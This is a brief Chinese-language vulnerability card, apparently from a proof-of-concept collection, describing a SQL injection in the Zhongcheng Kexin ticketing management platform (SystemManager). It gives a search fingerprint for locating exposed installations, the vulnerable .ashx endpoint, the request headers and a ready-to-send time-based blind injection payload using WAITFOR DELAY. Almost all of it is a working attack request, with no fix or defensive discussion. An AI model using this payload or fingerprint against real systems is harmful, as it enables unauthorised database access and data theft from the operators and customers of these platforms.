# 中城科信票务管理平台SystemManager-SQL注入漏洞

- **系统**：中城科信票务管理平台SystemManager　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"js/System/jquery.ellipsis.min.js"`
- **请求**：`POST /SystemManager/Planetarium/ReserveTicketManagerPlane.ashx HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Cookie: ASPSESSIONIDCCRBRCTD=LHLBDIBAKDEGBCJGKIKMNODE`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 71`

**请求体 / payload**
```
Method=GetGuideByCode&inputType=20&codeValue=1';WAITFOR+DELAY'0:0:5'--+
```